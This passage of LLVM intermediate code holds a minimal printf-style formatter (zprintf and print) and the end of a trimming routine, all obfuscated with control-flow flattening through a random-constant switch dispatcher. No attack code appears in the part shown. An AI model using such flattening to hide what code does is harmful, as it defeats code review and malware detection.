  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 636084276, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 -56714855, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -56714855, label %12
    i32 -270044105, label %18
    i32 1095902817, label %24
    i32 -277504158, label %32
    i32 -1030244797, label %33
    i32 -1806506321, label %39
    i32 -366162044, label %40
    i32 1608392318, label %46
    i32 781409526, label %49
    i32 -107673215, label %50
    i32 886305381, label %56
    i32 1190222246, label %61
    i32 1735109849, label %62
    i32 1139754468, label %68
    i32 -163204621, label %73
    i32 1196647700, label %75
    i32 1776871965, label %84
    i32 -990881931, label %87
    i32 -357906955, label %93
    i32 -1152708613, label %99
    i32 1324961077, label %105
    i32 -1084030199, label %110
    i32 -101577332, label %118
    i32 683763899, label %120
    i32 1879040134, label %121
    i32 -940752034, label %127
    i32 371746324, label %133
    i32 309039028, label %140
    i32 568073918, label %146
    i32 -329317998, label %151
    i32 -694562243, label %158
    i32 -1100597597, label %164
    i32 1404597673, label %171
    i32 1700913715, label %177
    i32 -1952757707, label %182
    i32 -1636366617, label %189
    i32 -459710785, label %195
    i32 2019094471, label %202
    i32 -1696367446, label %208
    i32 -46461076, label %213
    i32 425785300, label %220
    i32 -155513051, label %226
    i32 1887726927, label %233
    i32 1577106185, label %239
    i32 -856998761, label %244
    i32 6781181, label %251
    i32 1608278675, label %257
    i32 -1656044555, label %263
    i32 -537047854, label %269
    i32 1954845320, label %274
    i32 -2068862293, label %286
    i32 -1184179034, label %287
    i32 -1184715328, label %288
    i32 1959051503, label %295
    i32 1108530081, label %296
    i32 686917579, label %299
    i32 -1947901298, label %303
    i32 1676559800, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 -270044105, i32 686917579
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 1095902817, i32 -1184179034
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -277504158, i32 -1030244797
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 686917579, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 -1806506321, i32 -366162044
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -1184715328, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 1608392318, i32 781409526
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 781409526, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 -107673215, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 886305381, i32 1190222246
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 -107673215, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 1735109849, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 1139754468, i32 -163204621
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 -163204621, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 1196647700, i32 -990881931
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 1776871965, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 1735109849, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 -357906955, i32 -940752034
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 -1152708613, i32 1324961077
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 -1084030199, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 -1084030199, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 -101577332, i32 683763899
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 1879040134, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 1879040134, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 1108530081, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 371746324, i32 -694562243
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 309039028, i32 568073918
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 -329317998, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 -329317998, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 1108530081, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 -1100597597, i32 -1636366617
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 1404597673, i32 1700913715
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 -1952757707, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 -1952757707, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 1108530081, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 -459710785, i32 425785300
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 2019094471, i32 -1696367446
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 -46461076, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 -46461076, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 1108530081, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 -155513051, i32 6781181
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 1887726927, i32 1577106185
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 -856998761, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 -856998761, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 1108530081, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 1608278675, i32 -2068862293
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 -1656044555, i32 -537047854
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 1954845320, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 1954845320, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 1108530081, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 1959051503, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 -1184715328, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 1959051503, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 1108530081, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 -56714855, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 -1947901298, i32 1676559800
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 1676559800, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

